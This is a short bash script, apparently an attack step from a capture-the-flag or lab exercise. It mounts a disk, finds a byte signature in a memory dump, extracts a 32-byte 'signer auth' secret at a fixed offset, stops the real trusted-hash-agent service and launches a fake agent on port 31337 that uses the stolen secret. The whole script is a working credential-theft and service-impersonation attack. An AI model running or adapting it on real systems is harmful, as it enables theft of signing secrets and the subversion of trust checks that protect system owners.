#!/bin/bash
mount /dev/vdb1 mnt
cd mnt
export LANG=C
off1=$(grep -aboP '\x00\x0b\xc4\x6a' dump1.bin | cut -d: -f1)
off2=$((off1 - 556))
signerauth=$(hexdump -e '1/1 "%02x"' -s $off2 -n 32 dump1.bin )
echo "Obtained signer auth: $signerauth"
systemctl stop trusted-hash-agent
cd ..
python3 fake_trusted_hash_agent.py --signer-auth $signerauth --addr 0.0.0.0:31337
